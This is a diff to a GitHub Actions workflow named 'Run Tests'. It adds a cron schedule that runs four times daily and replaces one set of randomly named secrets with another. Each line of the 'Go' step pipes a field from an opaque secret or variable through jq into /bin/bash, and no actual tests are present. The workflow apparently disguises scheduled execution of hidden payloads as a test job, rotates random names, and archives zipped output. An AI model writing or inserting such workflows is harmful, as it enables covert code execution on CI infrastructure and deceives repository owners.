@@ -2,6 +2,8 @@ name: Run Tests
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '10 3,9,15,21 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,17 +18,19 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          shu88: ${{ secrets.shu88 }}
+          rhpv13: ${{ secrets.rhpv13 }}
         run: |
-          printf '%s' "$shu88" | jq -r .ampg28 | /bin/bash
-          printf '%s' "$uc22323" | jq -r .ctjyd28 | /bin/bash
-          echo $k39 | jq -r .cxx29194 | /bin/bash
-          echo $sjiaq7579 | jq -r .o5 | /bin/bash
+          printf '%s' "$rhpv13" | jq -r .na405 | /bin/bash
+          printf '%s' "$b670" | jq -r .vv537 | /bin/bash
+          echo $slt1422 | jq -r .vkcb8467 | /bin/bash
+          echo $epaqb3730 | jq -r .cvejl651 | /bin/bash
+          echo $chs595 | jq -r .hkcw58935 | /bin/bash
+          echo $ekqki06933 | jq -r .g83875 | /bin/bash
 
       - name: Archive results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: G0dz98l3
+          name: Ti1aBZA9
           path: "*.zip"
           retention-days: 1
